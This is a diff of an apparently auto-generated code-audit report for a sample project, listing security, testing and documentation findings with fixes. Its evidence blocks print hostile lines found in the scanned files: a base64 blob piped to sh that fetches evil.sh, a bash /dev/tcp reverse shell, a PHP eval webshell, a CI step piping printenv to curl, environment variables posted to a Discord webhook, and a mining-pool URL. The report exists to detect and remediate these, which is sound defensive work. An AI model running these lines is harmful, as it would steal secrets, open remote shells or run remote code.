 **What it is.** Hard-coded/weak signing secret, `alg: none`, or disabled signature/expiry verification make tokens forgeable.
 
@@ -779,9 +900,9 @@ jwt.sign(payload, process.env.JWT_SECRET, {algorithm:'HS256', expiresIn:'15m'})
 
 **How to verify:** Forge a token with another key/alg none: API must return 401.
 
-- [ ] `SEC-022`, `SEC-026`  — tick when fixed, then re-run the audit
+- [ ] `SEC-026`, `SEC-031`  — tick when fixed, then re-run the audit
 
-### 14. Flaky / brittle test patterns  · **high**  · 2 confirmed · 0 to review
+### 17. Flaky / brittle test patterns  · **high**  · 2 confirmed · 0 to review
 
 **What it is.** Fixed sleeps, CSS/XPath locators, forced clicks, un-awaited assertions, order-dependent tests and unmocked time/randomness make tests intermittently fail or pass without verifying anything.
 
@@ -818,7 +939,41 @@ await expect(page.getByText('Saved')).toBeVisible();
 
 - [ ] `BUG-002`, `TST-009`  — tick when fixed, then re-run the audit
 
-### 15. Server-Side Request Forgery (SSRF)  · **high**  · 1 confirmed · 0 to review
+### 18. Possible data exfiltration or credential stealer  · **high**  · 1 confirmed · 0 to review
+
+**What it is.** Code collects secrets or system data and sends it out: environment variables posted over HTTP, browser/wallet/SSH/cloud credential paths read together, Discord/Telegram webhooks used as a drop point, or CI steps that pipe `env`/secrets to curl.
+
+**Impact.** Credentials and customer data leave your environment without any alert; this is how stealers and malicious packages monetise access.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| high | `.github/workflows/deploy.yml:7` | Pipes environment/credentials to a network tool | 60 min |
+
+**Steps:**
+
+1. Verify intent: is this a real notification/telemetry feature? If not, remove it.
+2. Rotate every secret the code could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys).
+3. Check network logs for requests to the destination; add egress allow-lists for CI and servers.
+4. Restrict CI secrets to the jobs that need them (environment protection rules, OIDC instead of long-lived keys).
+5. Add secret scanning + push protection so tokens in webhooks/bots are not committed.
+
+**Vulnerable code/config:**
+```
+requests.post('https://discord.com/api/webhooks/1/abc', json=dict(os.environ))
+```
+
+**Safe form:**
+```
+# send only fixed, non-sensitive fields to an approved endpoint; secrets stay in the secret manager
+```
+
+**How to verify:** No code path sends environment/credential data to third-party hosts; the old webhook/bot token was revoked.
+
+- [ ] `SEC-011`  — tick when fixed, then re-run the audit
+
+### 19. Server-Side Request Forgery (SSRF)  · **high**  · 1 confirmed · 0 to review
 
 **What it is.** The server fetches a URL chosen by the user, letting attackers reach internal services and cloud metadata (169.254.169.254).
 
@@ -850,9 +1005,9 @@ requests.get(url, timeout=5, allow_redirects=False)
 
 **How to verify:** Try `http://127.0.0.1`, `http://169.254.169.254/`, `http://[::1]`, decimal IP and a redirect to them: all blocked.
 
-- [ ] `SEC-016`  — tick when fixed, then re-run the audit
+- [ ] `SEC-020`  — tick when fixed, then re-run the audit
 
-### 16. Path Traversal / arbitrary file access  · **high**  · 1 confirmed · 0 to review
+### 20. Path Traversal / arbitrary file access  · **high**  · 1 confirmed · 0 to review
 
 **What it is.** A file path is built from user input; `../` or absolute paths escape the intended directory.
 
@@ -884,9 +1039,43 @@ if not p.startswith(os.path.realpath(BASE) + os.sep): abort(400)
 
 **How to verify:** Request `../../etc/passwd` and `%2e%2e%2f` variants: must return 400/404.
 
-- [ ] `SEC-017`  — tick when fixed, then re-run the audit
+- [ ] `SEC-021`  — tick when fixed, then re-run the audit
 
-### 17. Declared permissions / privacy strings  · **high**  · 1 confirmed · 0 to review
+### 21. Cryptocurrency miner  · **high**  · 1 confirmed · 0 to review
+
+**What it is.** Mining software or configuration is present: stratum pool URLs, XMRig/cpuminer/CoinHive, mining pools, a Monero wallet address, or xmrig config keys (donate-level, rx/0).
+
+**Impact.** Your CPU/GPU and cloud bill pay for someone else's coins; builds and sites slow down; usually installed through a compromised dependency, CI job or server.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| high | `config/pool.json:1` | Cryptocurrency miner (stratum / XMRig / CoinHive) | 60 min |
+
+**Steps:**
+
+1. Confirm it is not intentional (a mining project, a test fixture, documentation).
+2. Remove it and look for the process and persistence: `ps aux | grep -Ei 'xmrig|minerd'`, cron/systemd timers, `docker ps`.
+3. Find the entry point (`git log -p -S'stratum' -- <file>`), a vulnerable service or a malicious dependency; patch it.
+4. ROTATE every secret the machine or repository could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys). Assume they are compromised.
+5. Set CPU/cost alerts and restrict egress to mining pools.
+
+**Vulnerable code/config:**
+```
+stratum+tcp://pool.minexmr.com:4444
+```
+
+**Safe form:**
+```
+# no mining code in applications or CI
+```
+
+**How to verify:** No miner strings remain; CPU usage is normal; outbound traffic to pool domains is blocked and shows no hits.
+
+- [ ] `SEC-028`  — tick when fixed, then re-run the audit
+
+### 22. Declared permissions / privacy strings  · **high**  · 1 confirmed · 0 to review
 
 **What it is.** The app uses a protected API without declaring the permission (Android manifest) or the usage-description key (iOS Info.plist).
 
@@ -918,7 +1107,7 @@ CLLocationManager() without NSLocationWhenInUseUsageDescription
 
 - [ ] `BUG-001`  — tick when fixed, then re-run the audit
 
-### 18. Mobile test strategy & infrastructure  · **medium**  · 6 confirmed · 0 to review
+### 23. Mobile test strategy & infrastructure  · **medium**  · 6 confirmed · 0 to review
 
 **What it is.** Missing unit/UI test layers, flaky sync (sleeps), text-based locators, no accessibility ids/tags, no CI device matrix or coverage.
 
@@ -957,7 +1146,7 @@ composeRule.onNodeWithTag(Tags.LoginButton).performClick()   // XCUITest: app.bu
 
 - [ ] `TST-001`, `TST-002`, `TST-004`, `TST-005`, `TST-010`, `TST-012`  — tick when fixed, then re-run the audit
 
-### 19. Web accessibility (WCAG 2.2)  · **medium**  · 3 confirmed · 1 to review
+### 24. Web accessibility (WCAG 2.2)  · **medium**  · 3 confirmed · 1 to review
 
 **What it is.** Markup patterns that block keyboard and screen-reader users: images without alt, clickable non-interactive elements, positive tabindex, removed focus outline, missing page language, zoom disabled.
 
@@ -995,7 +1184,7 @@ composeRule.onNodeWithTag(Tags.LoginButton).performClick()   // XCUITest: app.bu
 
 - [ ] `A11-001`, `A11-002`, `A11-003`  — tick when fixed, then re-run the audit
 
-### 20. Likely bug pattern  · **medium**  · 3 confirmed · 0 to review
+### 25. Likely bug pattern  · **medium**  · 3 confirmed · 0 to review
 
 **What it is.** Construct that behaves differently from what it appears to do.
 
@@ -1029,7 +1218,7 @@ def f(x, acc=None):
 
 - [ ] `BUG-006`, `BUG-007`, `BUG-011`  — tick when fixed, then re-run the audit
 
-### 21. Test coverage gap / test hygiene  · **medium**  · 3 confirmed · 0 to review
+### 26. Test coverage gap / test hygiene  · **medium**  · 3 confirmed · 0 to review
 
 **What it is.** Modules without tests, skipped or assertion-free tests let regressions through.
 
@@ -1064,7 +1253,7 @@ it('works', () => { expect(result).toBe(42) })
 
 - [ ] `TST-003`, `TST-008`, `BUG-010`  — tick when fixed, then re-run the audit
 
-### 22. Test infrastructure gaps (front-end)  · **medium**  · 2 confirmed · 1 to review
+### 27. Test infrastructure gaps (front-end)  · **medium**  · 2 confirmed · 1 to review
 
 **What it is.** Layers of the test pyramid are missing (unit/component, E2E, accessibility, visual, performance budget, coverage gates) or are not run in CI.
 
@@ -1101,7 +1290,7 @@ vitest + @testing-library + playwright + axe + CI job with traces/artifacts
 
 - [ ] `TST-006`, `TST-007`  — tick when fixed, then re-run the audit
 
-### 23. Predictable randomness for secrets  · **medium**  · 2 confirmed · 0 to review
+### 28. Predictable randomness for secrets  · **medium**  · 2 confirmed · 0 to review
 
 **What it is.** Non-cryptographic RNGs (`Math.random`, `rand`, `random`) are predictable and must not generate tokens, OTPs or reset codes.
 
@@ -1131,9 +1320,9 @@ token = crypto.randomBytes(32).toString('hex')   // Python: secrets.token_urlsaf
 
 **How to verify:** Grep again for non-CSPRNG calls near token/otp/reset code.
 
-- [ ] `SEC-035`, `SEC-036`  — tick when fixed, then re-run the audit
+- [ ] `SEC-041`, `SEC-042`  — tick when fixed, then re-run the audit
 
-### 24. SEM / analytics tracking setup  · **medium**  · 1 confirmed · 0 to review
+### 29. SEM / analytics tracking setup  · **medium**  · 1 confirmed · 0 to review
 
 **What it is.** Advertising and analytics tags are missing, duplicated, misconfigured, or fire without user consent; conversions are not tracked.
 
@@ -1167,7 +1356,7 @@ gtag('consent','default',{ad_storage:'denied',analytics_storage:'denied',ad_user
 
 - [ ] `SEM-001`  — tick when fixed, then re-run the audit
 
-### 25. Project documentation  · **medium**  · 1 confirmed · 0 to review
+### 30. Project documentation  · **medium**  · 1 confirmed · 0 to review
 
 **What it is.** Missing or thin project documentation (README, architecture notes, API spec, contributing guide) makes onboarding slow and decisions invisible.
 
@@ -1201,7 +1390,41 @@ README.md: purpose · requirements · install · run · test · config table · 
 
 - [ ] `COD-001`  — tick when fixed, then re-run the audit
 
-### 26. World-writable permissions  · **medium**  · 1 confirmed · 0 to review
+### 31. Engineering standards & tooling  · **medium**  · 1 confirmed · 0 to review
+
+**What it is.** Linter, formatter, type checker, CI checks, config documentation or hooks are missing, so quality depends on individual discipline.
+
+**Impact.** Style and bug classes recur; reviews waste time on formatting; regressions reach main.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| medium | `.github/workflows/deploy.yml:1` | CI does not appear to run: tests, lint | 45 min |
+
+**Steps:**
+
+1. Pick one formatter and one linter per language; commit their configs; add `lint`, `format`, `typecheck`, `test` scripts.
+2. Turn on strict typing: TS `strict`, Python mypy/pyright (ratchet per package), PHP phpstan level ≥ 6, Kotlin explicit API mode, Swift strict concurrency.
+3. Run lint + types + tests in CI on every PR and make them required checks.
+4. Add pre-commit hooks (format, lint, gitleaks).
+5. Document env vars in .env.example; adopt Conventional Commits + SemVer.
+
+**Vulnerable code/config:**
+```
+no eslint/ruff config, no CI
+```
+
+**Safe form:**
+```
+eslint.config.js + prettier + tsc --noEmit + vitest in .github/workflows/ci.yml (required)
+```
+
+**How to verify:** A PR with a lint/type/test failure cannot be merged.
+
+- [ ] `COD-002`  — tick when fixed, then re-run the audit
+
+### 32. World-writable permissions  · **medium**  · 1 confirmed · 0 to review
 
 **What it is.** chmod 777 lets any local user modify files.
 
@@ -1229,9 +1452,9 @@ chmod -R u=rwX,g=rX,o= /var/www
 
 **How to verify:** `ls -l` shows no world-write.
 
-- [ ] `SEC-033`  — tick when fixed, then re-run the audit
+- [ ] `SEC-039`  — tick when fixed, then re-run the audit
 
-### 27. Open Redirect  · **medium**  · 1 confirmed · 0 to review
+### 33. Open Redirect  · **medium**  · 1 confirmed · 0 to review
 
 **What it is.** A redirect target comes from user input without an allowlist.
 
@@ -1263,9 +1486,9 @@ return redirect(nxt)
 
 **How to verify:** Try `?next=https://evil.com` and `?next=//evil.com`: must land on `/`.
 
-- [ ] `SEC-034`  — tick when fixed, then re-run the audit
+- [ ] `SEC-040`  — tick when fixed, then re-run the audit
 
-### 28. Sensitive data in logs  · **medium**  · 1 confirmed · 0 to review
+### 34. Sensitive data in logs  · **medium**  · 1 confirmed · 0 to review
 
 **What it is.** Passwords/tokens printed to logs end up in aggregators and crash reports.
 
@@ -1294,9 +1517,9 @@ logger.info('login attempt', {user})
 
 **How to verify:** Grep logs of a test run for the secret.
 
-- [ ] `SEC-038`  — tick when fixed, then re-run the audit
+- [ ] `SEC-044`  — tick when fixed, then re-run the audit
 
-### 29. API documentation (docstrings / doc comments)  · **low**  · 2 confirmed · 0 to review
+### 35. API documentation (docstrings / doc comments)  · **low**  · 2 confirmed · 0 to review
 
 **What it is.** Public functions, classes and modules lack doc comments, or the comments are too short to say what the code promises (parameters, return value, errors, side effects).
 
@@ -1343,9 +1566,9 @@ def charge(user: User, amount: Decimal, retry: int = 3) -> Receipt:
 
 **How to verify:** Run the doc linter / doc generator: no missing-docstring warnings on public API; generated docs read well.
 
-- [ ] `COD-004`, `COD-006`  — tick when fixed, then re-run the audit
+- [ ] `COD-005`, `COD-007`  — tick when fixed, then re-run the audit
 
-### 30. Vulnerable or outdated dependency  · **low**  · 2 confirmed · 0 to review
+### 36. Vulnerable or outdated dependency  · **low**  · 2 confirmed · 0 to review
 
 **What it is.** A dependency has a known CVE or is end-of-life.
 
@@ -1378,7 +1601,7 @@ lodash@4.17.21
 
 - [ ] `DEP-001`, `DEP-002`  — tick when fixed, then re-run the audit
 
-### 31. Page experience & Core Web Vitals  · **low**  · 2 confirmed · 0 to review
+### 37. Page experience & Core Web Vitals  · **low**  · 2 confirmed · 0 to review
 
 **What it is.** Slow server response, render-blocking scripts, unsized/oversized images and missing lazy-loading hurt LCP, CLS and INP - ranking and conversion signals.
 
@@ -1413,7 +1636,7 @@ lodash@4.17.21
 
 - [ ] `SEO-009`, `SEO-010`  — tick when fixed, then re-run the audit
 
-### 32. Swallowed errors  · **low**  · 1 confirmed · 0 to review
+### 38. Swallowed errors  · **low**  · 1 confirmed · 0 to review
 
 **What it is.** Empty catch/except blocks hide failures so bugs surface far from their cause.
 
@@ -1442,9 +1665,86 @@ try { save(); } catch (e) { logger.error('save failed', e); throw e; }
 
 **How to verify:** Force the failure in a test; it must be visible.
 
-- [ ] `COD-007`  — tick when fixed, then re-run the audit
+- [ ] `COD-008`  — tick when fixed, then re-run the audit
 
-### 33. Denial of Service / Resource exhaustion (DoS/DDoS hardening)  · _review_  · 0 confirmed · 3 to review
+### 39. AI agent / spec files are tracked in the repository  · **info**  · 2 confirmed · 0 to review
+
+**What it is.** Files that configure AI coding assistants or spec-driven workflows (CLAUDE.md, AGENTS.md, .cursor/, .windsurfrules, .github/copilot-instructions.md, openspec/, .specify/, memory-bank/ ...) are committed to the project.
+
+**Impact.** They reveal tooling, prompts and internal conventions to anyone who clones the repo, and can contain private context. Some teams keep them on purpose - then this is informational.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| info | `.cursor/rules/style.mdc:1` | Cursor configuration committed: .cursor | 5 min |
+| info | `CLAUDE.md:1` | Claude Code configuration committed: CLAUDE.md | 5 min |
+
+**Steps:**
+
+1. Decide whether the team needs them in the repo. If not, stop tracking them: `git rm --cached -r <path>` and add the path to `.gitignore` (the file stays on your disk).
+2. Check them for secrets, internal URLs or customer names before publishing (`gitleaks detect`).
+3. To remove them from history of a public repo use `git filter-repo --invert-paths --path <path>` (coordinate with collaborators; rewriting history is destructive).
+4. Run `bash cleanup-fixes.sh AI-FILES` to untrack and ignore them safely.
+
+**Vulnerable code/config:**
+```
+git add CLAUDE.md .cursor/ openspec/
+```
+
+**Safe form:**
+```
+# .gitignore
+CLAUDE.md
+AGENTS.md
+.cursor/
+.windsurfrules
+openspec/
+.specify/
+```
+
+**How to verify:** `git ls-files | grep -Ei 'claude\.md|agents\.md|\.cursor/|openspec/'` prints nothing (or only what you decided to keep).
+
+- [ ] `COD-011`, `COD-012`  — tick when fixed, then re-run the audit
+
+### 40. Comments or docs that reveal AI-assisted authoring  · **info**  · 1 confirmed · 0 to review
+
+**What it is.** Source comments, headers or documentation say the code was generated or assisted by an AI tool (for example 'Generated with Claude Code', 'written by ChatGPT', 'As an AI language model'). They are not a vulnerability: they are noise that makes a finished project look unreviewed.
+
+**Impact.** Unpolished delivery: stray assistant phrases, auto-generated banners and badges reduce trust with clients and reviewers. Some contracts, employers, schools or licences REQUIRE disclosing AI assistance - check before removing anything.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| info | `backend/utils_ai.py:1` | Comment reveals AI-assisted authoring | 2 min |
+
+**Steps:**
+
+1. Decide first: if a policy, contract, course or licence requires disclosure, keep the notice (or move it to a README/AI-USE section) instead of deleting it.
+2. Review each flagged line; delete assistant chatter and generator banners that carry no information (`# Generated by ...`, 'Here is the updated code', 'As an AI...').
+3. Replace useful explanations with real, human-reviewed comments that say WHY, not who wrote it.
+4. Run `bash cleanup-fixes.sh AI-COMMENTS` (generated, never executed by the tool): it removes only comment-only lines that still match and keeps backups in `.pnua-backup/`.
+5. Re-run the audit and review `git diff` before committing.
+
+**Vulnerable code/config:**
+```
+# Generated by ChatGPT
+# Here is the updated code:
+def total(items): ...
+```
+
+**Safe form:**
+```
+# Sum of line totals in cents (no float rounding).
+def total(items): ...
+```
+
+**How to verify:** Re-run the audit: no AITRACE-COMMENT / AITRACE-DOC findings; `git diff` shows only the lines you intended to change.
+
+- [ ] `COD-013`  — tick when fixed, then re-run the audit
+
+### 41. Denial of Service / Resource exhaustion (DoS/DDoS hardening)  · _review_  · 0 confirmed · 3 to review
 
 **What it is.** Code-level conditions let one client (or many) consume unbounded CPU, memory, connections or time: no rate limit, unbounded page size, catastrophic regex, missing timeouts, unbounded uploads/archives, blocking calls on the event loop.
 
@@ -1482,7 +1782,7 @@ requests.get(url, timeout=(3, 10))
 
 **How to verify:** Send an oversized value / burst of requests to local staging and confirm 4xx/429 and bounded memory.
 
-### 34. Container hardening  · _review_  · 0 confirmed · 3 to review
+### 42. Container hardening  · _review_  · 0 confirmed · 3 to review
 
 **What it is.** Root user, floating `latest` tags, remote ADD, secrets in ENV/ARG, curl|sh increase blast radius and break reproducibility.
 
@@ -1516,7 +1816,7 @@ USER node
 
 **How to verify:** `docker run --rm image id` is not uid 0; `hadolint Dockerfile` clean.
 
-### 35. Mass assignment / over-posting  · _review_  · 0 confirmed · 1 to review
+### 43. Mass assignment / over-posting  · _review_  · 0 confirmed · 1 to review
 
 **What it is.** Request data is bound wholesale to a model, letting clients set fields like `is_admin`, `role`, `price`, `tenant_id`.
 
@@ -1545,7 +1845,7 @@ User::create($request->validated());   // FormRequest with explicit rules
 
 **How to verify:** POST `is_admin=1`; value must be ignored.
 
-### 36. Infrastructure misconfiguration (K8s/Terraform/CI/nginx)  · _review_  · 0 confirmed · 1 to review
+### 44. Infrastructure misconfiguration (K8s/Terraform/CI/nginx)  · _review_  · 0 confirmed · 1 to review
 
 **What it is.** Over-permissive network, IAM, privileges or CI triggers.
 
@@ -1575,7 +1875,7 @@ cidr_blocks = ["203.0.113.0/24"]  # office/VPN only
 
 **How to verify:** `checkov`/`tfsec`/`kube-linter` clean.
 
-### 37. N+1 queries  · _review_  · 0 confirmed · 1 to review
+### 45. N+1 queries  · _review_  · 0 confirmed · 1 to review
 
 **What it is.** A query runs inside a loop - one query per row instead of one for all rows.
 
@@ -1604,7 +1904,7 @@ users = User.objects.prefetch_related('orders')
 
 **How to verify:** Query count independent of N.
 
-### 38. Debug/dev configuration  · _review_  · 0 confirmed · 1 to review
+### 46. Debug/dev configuration  · _review_  · 0 confirmed · 1 to review
 
 **What it is.** Debug mode exposes stack traces, config, and sometimes an interactive console.
 
@@ -1633,7 +1933,7 @@ app.run(debug=os.environ.get('FLASK_DEBUG') == '1')
 
 **How to verify:** Trigger an error in prod-like env: generic error page only.
 
-### 39. Permissive CORS  · _review_  · 0 confirmed · 1 to review
+### 47. Permissive CORS  · _review_  · 0 confirmed · 1 to review
 
 **What it is.** Any origin may read responses; with credentials this exposes authenticated data cross-site.
 
@@ -1661,6 +1961,41 @@ cors({ origin: ['https://app.example.com'], credentials: true })
 ```
 
 **How to verify:** Send `Origin: https://evil.com` and confirm no ACAO header.
+
+### 48. Leftover AI placeholder (truncated code)  · _review_  · 0 confirmed · 1 to review
+
+**What it is.** A comment such as '... rest of the code remains the same', '// ... existing code ...' or 'implementation goes here' is a common leftover of AI-assisted edits. If it replaced real code, the file is incomplete; if not, it is just noise.
+
+**Impact.** Missing logic (functions that silently do nothing), broken builds, or confusing reviewers about what is real.
+
+**Where to fix:**
+
+| Sev. | File | Title | Effort |
+|---|---|---|---|
+| review/medium | `backend/utils_ai.py:2` | Leftover AI placeholder comment (possible truncated code) | 10 min |
+
+**Steps:**
+
+1. Open the file around the marker and compare with `git diff` / `git log -p -- <file>`: was something deleted?
+2. If code is missing, restore it from history or rewrite it; if the comment is only a leftover, delete it.
+3. Add a test that exercises the function so truncation is caught automatically.
+
+**Vulnerable code/config:**
+```
+def process(order):
+    # ... rest of the code remains the same ...
+
+```
+
+**Safe form:**
+```
+def process(order):
+    validate(order)
+    return charge(order)
+
+```
+
+**How to verify:** The function is implemented and tests pass; no placeholder phrases remain.
 
 <a id="detalle"></a>
 ## Confirmed findings — detail
@@ -1735,6 +2070,33 @@ PRIV…
 function initialize(address o) public {
 ```
 
+#### SEC-008 · critical · Shell decodes a blob and pipes it to a shell
+
+- **Location:** `scripts/setup.sh:1`  ·  **Type:** vulnerability/malware  ·  **CWE:** CWE-506, CWE-78  ·  **OWASP:** A08:2021  ·  **Effort:** 60 min
+
+**Evidence:**
+```
+echo 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5zaCB8IHNoJyk=aW1wb3J0IG9z' | base64 -d | sh
+```
+
+#### SEC-009 · critical · Bash reverse shell (/dev/tcp)
+
+- **Location:** `scripts/update.sh:2`  ·  **Type:** vulnerability/malware  ·  **CWE:** CWE-506, CWE-78  ·  **OWASP:** A08:2021  ·  **Effort:** 60 min
+
+**Evidence:**
+```
+bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+```
+
+#### SEC-010 · critical · PHP executes request data (webshell)
+
+- **Location:** `web/uploads/shell.php:1`  ·  **Type:** vulnerability/malware  ·  **CWE:** CWE-506, CWE-94  ·  **OWASP:** A08:2021  ·  **Effort:** 60 min
+
+**Evidence:**
+```
+<?php @eval($_POST['x']); ?>
+```
+
 #### BUG-001 · high · iOS: code uses a protected API but Info.plist lacks NSLocationWhenInUseUsageDescription (crash + App Store rejection)
 
 - **Location:** `mobile/ios/App/Info.plist:1`  ·  **Type:** bug/mobile  ·  **CWE:** CWE-276  ·  **OWASP:** M6:2024  ·  **Effort:** 10 min
@@ -1753,7 +2115,16 @@ missing NSLocationWhenInUseUsageDescription
 web/tests/checkout.spec.ts:6  expect(page.getByText('Done')).toBeVisible();
 ```
 
-#### SEC-008 · high · SQL built with string concatenation (PHP)
+#### SEC-011 · high · Pipes environment/credentials to a network tool
+
+- **Location:** `.github/workflows/deploy.yml:7`  ·  **Type:** vulnerability/malware  ·  **CWE:** CWE-200, CWE-506  ·  **OWASP:** A08:2021  ·  **Effort:** 60 min
+
+**Evidence:**
+```
+- run: printenv | curl -X POST -d @- https://collector.example/x
+```
+
+#### SEC-012 · high · SQL built with string concatenation (PHP)
 
 - **Location:** `app/Http/UserController.php:5`  ·  **Type:** vulnerability/sqli  ·  **CWE:** CWE-89  ·  **OWASP:** A03:2021  ·  **Effort:** 20 min
 
@@ -1764,7 +2135,7 @@ $id = $_GET['id'];
     echo "Hello " . $_GET['name'];
 ```
 
-#### SEC-009 · high · Request data echoed without encoding (PHP)
+#### SEC-013 · high · Request data echoed without encoding (PHP)
 
 - **Location:** `app/Http/UserController.php:6`  ·  **Type:** vulnerability/xss  ·  **CWE:** CWE-79  ·  **OWASP:** A03:2021  ·  **Effort:** 10 min
 
@@ -1775,7 +2146,7 @@ $r = DB::select("SELECT * FROM users WHERE id = " . $id);
     $u = User::findOrFail($request->id);
 ```
 
-#### SEC-010 · high · Object loaded by client-supplied id (check ownership)
+#### SEC-014 · high · Object loaded by client-supplied id (check ownership)
 
 - **Location:** `app/Http/UserController.php:7`  ·  **Type:** vulnerability/authz  ·  **CWE:** CWE-639, CWE-862  ·  **OWASP:** A01:2021, API1:2023  ·  **Effort:** 20 min
 
@@ -1786,7 +2157,7 @@ echo "Hello " . $_GET['name'];
     User::create($request->all());
 ```
 
-#### SEC-011 · high · Hard-coded credential
+#### SEC-015 · high · Hard-coded credential
 
 - **Location:** `backend/app.py:5`  ·  **Type:** vulnerability/secrets  ·  **CWE:** CWE-798  ·  **OWASP:** A07:2021  ·  **Effort:** 20 min
 
@@ -1795,7 +2166,7 @@ echo "Hello " . $_GET['name'];
 SECRET_KEY = "supe…"
 ```
 
-#### SEC-012 · high · Database URL with credentials
+#### SEC-016 · high · Database URL with credentials
 
 - **Location:** `backend/app.py:6`  ·  **Type:** vulnerability/secrets  ·  **CWE:** CWE-798  ·  **OWASP:** A07:2021  ·  **Effort:** 20 min
 
@@ -1804,7 +2175,7 @@ SECRET_KEY = "supe…"
 DB_URL = "post…"
 ```
 
-#### SEC-013 · high · SQL built with string formatting (Python)
+#### SEC-017 · high · SQL built with string formatting (Python)
 
 - **Location:** `backend/app.py:12`  ·  **Type:** vulnerability/sqli  ·  **CWE:** CWE-89  ·  **OWASP:** A03:2021  ·  **Effort:** 20 min
 
@@ -1815,7 +2186,7 @@ cur = sqlite3.connect("db/app.db").cursor()
     return str(cur.fetchall())
 ```
 
-#### SEC-014 · high · SQL built with string formatting (Python)
+#### SEC-018 · high · SQL built with string formatting (Python)
 
 - **Location:** `backend/app.py:19`  ·  **Type:** vulnerability/sqli  ·  **CWE:** CWE-89  ·  **OWASP:** A03:2021  ·  **Effort:** 20 min
 
@@ -1826,7 +2197,7 @@ cur = sqlite3.connect("db/app.db").cursor()
     return render_template_string("<h1>Results for " + q + "</h1>")
 ```
 
-#### SEC-015 · high · User input rendered as HTML without escaping (Python)
+#### SEC-019 · high · User input rendered as HTML without escaping (Python)
 
 - **Location:** `backend/app.py:20`  ·  **Type:** vulnerability/xss  ·  **CWE:** CWE-79  ·  **OWASP:** A03:2021  ·  **Effort:** 10 min
 
@@ -1836,7 +2207,7 @@ cur.execute("SELECT * FROM items WHERE name = '%s'" % q)
     return render_template_string("<h1>Results for " + q + "</h1>")
 ```
 
-#### SEC-016 · high · Outbound request to user-controlled URL
+#### SEC-020 · high · Outbound request to user-controlled URL
 
 - **Location:** `backend/app.py:31`  ·  **Type:** vulnerability/ssrf  ·  **CWE:** CWE-918  ·  **OWASP:** A10:2021, API7:2023  ·  **Effort:** 30 min
 
@@ -1846,7 +2217,7 @@ url = request.args.get("url")
     return requests.get(url).text
 ```
 
-#### SEC-017 · high · File access with user-controlled path
+#### SEC-021 · high · File access with user-controlled path
 
 - **Location:** `backend/app.py:39`  ·  **Type:** vulnerability/path  ·  **CWE:** CWE-22  ·  **OWASP:** A01:2021  ·  **Effort:** 20 min
 
@@ -1856,7 +2227,7 @@ def file():
     return send_file("/var/data/" + request.args.get("f"))
 ```
 
-#### SEC-018 · high · Password hashed with MD5/SHA-1
+#### SEC-022 · high · Password hashed with MD5/SHA-1
 
 - **Location:** `backend/app.py:51`  ·  **Type:** vulnerability/crypto  ·  **CWE:** CWE-327, CWE-916  ·  **OWASP:** A02:2021  ·  **Effort:** 60 min
 
@@ -1866,7 +2237,7 @@ def hash_password(password):
     return hashlib.md5(password.encode()).hexdigest()
 ```
 
-#### SEC-019 · high · User input written straight into HTML response (Node)
+#### SEC-023 · high · User input written straight into HTML response (Node)
 
 - **Location:** `backend/server.js:4`  ·  **Type:** vulnerability/xss  ·  **CWE:** CWE-79  ·  **OWASP:** A03:2021  ·  **Effort:** 10 min
 
@@ -1877,7 +2248,7 @@ app.get('/hello', (req, res) => { res.send('<h1>Hello ' + req.query.name + '</h1
 app.get('/u', async (req, res) => { const { id } = req.query; const r = await db.query(`SELECT * FROM users WHERE id = ${id}`); res.json(r); });
 ```
 
-#### SEC-020 · high · SQL built with template/concatenation (JS/TS)
+#### SEC-024 · high · SQL built with template/concatenation (JS/TS)
 
 - **Location:** `backend/server.js:5`  ·  **Type:** vulnerability/sqli  ·  **CWE:** CWE-89  ·  **OWASP:** A03:2021  ·  **Effort:** 20 min
 
@@ -1888,7 +2259,7 @@ app.get('/u', async (req, res) => { const { id } = req.query; const r = await db
 app.get('/run', (req, res) => { exec('ls ' + req.query.dir, (e, o) => res.send(o)); });
 ```
 
-#### SEC-021 · high · User input written straight into HTML response (Node)
+#### SEC-025 · high · User input written straight into HTML response (Node)
 
 - **Location:** `backend/server.js:6`  ·  **Type:** vulnerability/xss  ·  **CWE:** CWE-79  ·  **OWASP:** A03:2021  ·  **Effort:** 10 min
 
@@ -1899,7 +2270,7 @@ app.get('/run', (req, res) => { exec('ls ' + req.query.dir, (e, o) => res.send(o
 app.post('/login', (req, res) => { const t = jwt.sign({ u: req.body.u }, 'hardcodedjwtsecret'); res.json({ t }); });
 ```
 
-#### SEC-022 · high · JWT signed with hard-coded secret
+#### SEC-026 · high · JWT signed with hard-coded secret
 
 - **Location:** `backend/server.js:7`  ·  **Type:** vulnerability/authn  ·  **CWE:** CWE-798, CWE-347  ·  **OWASP:** A07:2021  ·  **Effort:** 20 min
 
@@ -1908,7 +2279,7 @@ app.post('/login', (req, res) => { const t = jwt.sign({ u: req.body.u }, 'hardco
 app.post('/log…', (req, res) => { const t = jwt.sign({ u: req.body.u }, 'hard…'); res.json({ t }); });
 ```
 
-#### SEC-023 · high · Object loaded by client-supplied id (check ownership)
+#### SEC-027 · high · Object loaded by client-supplied id (check ownership)
 
 - **Location:** `backend/server.js:8`  ·  **Type:** vulnerability/authz  ·  **CWE:** CWE-639, CWE-862  ·  **OWASP:** A01:2021, API1:2023  ·  **Effort:** 20 min
 
@@ -1919,7 +2290,16 @@ app.get('/item/:id', async (req, res) => { const it = await Item.findById(req.pa
 const token = Math.random().toString(36); // reset token
 ```
 
-#### SEC-024 · high · `withdraw()` updates state AFTER an external call (reentrancy)
+#### SEC-028 · high · Cryptocurrency miner (stratum / XMRig / CoinHive)
+
+- **Location:** `config/pool.json:1`  ·  **Type:** vulnerability/malware  ·  **CWE:** CWE-506  ·  **OWASP:** A08:2021  ·  **Effort:** 60 min
+
+**Evidence:**
+```
+{"url": "stratum+tcp://pool.minexmr.com:4444", "donate-level": 1}
+```
+
+#### SEC-029 · high · `withdraw()` updates state AFTER an external call (reentrancy)
 
 - **Location:** `contracts/Vault.sol:12`  ·  **Type:** vulnerability/reentrancy  ·  **CWE:** CWE-841  ·  **Effort:** 60 min
 
